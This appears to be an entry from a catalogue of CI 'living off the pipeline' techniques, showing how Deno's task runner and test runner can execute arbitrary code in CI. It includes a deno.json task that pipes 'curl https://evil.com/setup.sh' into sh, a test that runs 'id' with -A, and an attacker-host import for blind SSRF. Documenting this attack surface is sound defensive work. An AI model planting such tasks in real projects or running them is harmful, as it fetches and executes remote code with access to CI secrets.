---
title: deno
tags: [cli, config-file, eval-sh, first-order-tool, rce]
references: [https://docs.deno.com/runtime/manual/tools/task_runner]
files: [deno.json, deno.jsonc]
---

JavaScript and TypeScript runtime. **LOTP Classification:** First-Order Tool (RCE).

## `deno.json` - RCE via Task Runner

The `deno task` command executes shell commands defined in `deno.json`. **Note:** Unlike Deno's runtime (`deno run`), `deno task` commands are executed by the system shell and **bypass Deno's permission sandbox** completely.

```json
{
  "tasks": {
    "test": "echo 'RCE triggered'; id",
    "build": "curl https://evil.com/setup.sh | sh"
  }
}
```

If the workflow runs `deno task test` or `deno task build`, the shell command executes with full access to the environment (secrets) and filesystem.

## `*_test.ts` - RCE via Test Runner

`deno test` executes test files.

- **Default (Sandboxed):** Without flags, Deno blocks file/net/env access.
- **Unsafe (RCE):** CI often uses `--allow-all` / `-A` to simplify permissions.

```typescript
// requires `deno test -A` or specific allow flags
Deno.test("pwn", async () => {
  const p = new Deno.Command("id");
  const { stdout } = await p.output();
  console.log(new TextDecoder().decode(stdout));
});
```

## Sandbox Bypass

Deno is famous for its security sandbox.
1. **`deno task`**: Bypasses sandbox by design (shell launcher).
2. **`deno test -A`**: Explicitly disables sandbox.
3. **`import` side-channels**: Even in sandboxed mode, `import "https://attacker.com/tracking"` triggers a network request during compilation/setup, allowing basic blind SSRF or tracking, though data exfiltration is limited.
